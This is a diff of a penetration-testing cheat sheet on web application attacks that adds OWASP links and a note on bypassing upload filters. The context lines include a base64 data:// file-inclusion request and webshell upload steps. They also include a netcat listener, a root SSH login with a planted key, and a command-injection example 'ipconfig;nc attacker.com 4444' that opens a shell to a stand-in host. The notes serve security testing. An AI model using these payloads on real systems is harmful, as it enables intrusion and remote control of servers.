@@ -1,6 +1,8 @@
 
 # Common Attacks towards Web Applications
 
+Important! [OWASP Web Application Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README)
+
 ## Directory Traversal
 
 * Test if path traversal is possible
@@ -118,6 +120,7 @@ curl "http://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyB
 
 * Find file uploads in the app (images, texts, doc)
 * Identify programming language
+* Identify if block list or filters can be bypassed
 * Try to upload a webshell `/usr/share/webshells`
 * Identify underlying OS
 * Setup a TCP listener `nc -nlvp 4444`
@@ -156,6 +159,7 @@ ssh -i new-key root@target.com
 
 ## Command Injection
 
+* [OWASP Test for Command Injections](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
 * Shell command seperator %3B = ';'
 * e.g. ipconfig;nc attacker.com 4444
 * e.g. ";ls #
